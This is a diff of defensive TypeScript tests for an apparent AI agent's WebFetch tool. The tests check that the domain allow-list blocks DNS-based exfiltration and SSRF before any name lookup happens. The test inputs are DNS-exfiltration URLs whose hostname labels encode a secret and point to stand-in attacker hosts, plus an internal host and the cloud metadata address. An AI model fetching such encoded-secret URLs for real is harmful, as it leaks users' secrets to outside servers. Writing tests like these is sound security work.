@@ -172,6 +172,82 @@ describe("T8 — WebFetch scheme + allow-list", () => {
   });
 });
 
+// A DNS lookup is egress: `<hex-of-a-secret>.attacker.test` reaches the
+// attacker's name server whether or not anything connects. 0.7.0 resolved
+// the host (the SSRF guard) before checking allowed_domains, on the first
+// request and on every redirect hop, so the allow-list did not stop that.
+describe("WebFetch — allow-list is checked before DNS (C028)", () => {
+  const recordLookups = (address = "93.184.216.34"): string[] => {
+    const looked: string[] = [];
+    _setDnsLookup(async (host: string) => {
+      looked.push(host);
+      return { address, family: 4 };
+    });
+    return looked;
+  };
+
+  test("a host outside allowed_domains is refused without being resolved", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups();
+    _setRawFetch(async () => {
+      throw new Error("must not fetch");
+    });
+    await expect(
+      webFetch.execute({ url: "https://73656372.exfil.attacker.test/" }),
+    ).rejects.toThrow(/not in allowed_domains/);
+    expect(looked).toEqual([]);
+  });
+
+  test("a redirect to a host outside allowed_domains is refused without being resolved", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups();
+    _setRawFetch(async (req: Request) =>
+      new URL(req.url).hostname === "example.com"
+        ? new Response(null, {
+            status: 302,
+            headers: { location: "https://c2vjcmv0.attacker.test/" },
+          })
+        : new Response("ok", { status: 200 }),
+    );
+    await expect(webFetch.execute({ url: "https://example.com/" })).rejects.toThrow(
+      /not in allowed_domains/,
+    );
+    expect(looked).toEqual(["example.com"]);
+  });
+
+  test("a per-call allow-list is checked before DNS too", async () => {
+    const looked = recordLookups();
+    _setRawFetch(async () => {
+      throw new Error("must not fetch");
+    });
+    await expect(
+      webFetch.execute({ url: "https://leak3.attacker.test/" }, {
+        toolConfig: { allowed_domains: ["example.com"] },
+      } as never),
+    ).rejects.toThrow(/not in allowed_domains/);
+    expect(looked).toEqual([]);
+  });
+
+  test("an internal host outside the list is refused by the list, and its address is never learned", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups("10.65.66.67");
+    const error = await webFetch.execute({ url: "https://db.internal.corp/" }).then(
+      () => null,
+      (e: unknown) => e as Error,
+    );
+    expect(error?.message).toMatch(/not in allowed_domains/);
+    expect(error?.message).not.toContain("10.65.66.67");
+    expect(looked).toEqual([]);
+  });
+
+  test("an allow-listed host is still resolved and still refused when it resolves privately", async () => {
+    registerWebFetchConfig({ allowed_domains: ["example.com"] });
+    const looked = recordLookups("169.254.169.254");
+    await expect(webFetch.execute({ url: "https://example.com/" })).rejects.toThrow(/private/i);
+    expect(looked).toEqual(["example.com"]);
+  });
+});
+
 describe("WebFetch — SSRF guard (#141)", () => {
   test("rejects the cloud-metadata IP even with an empty allow-list", async () => {
     _setRawFetch(async () => {
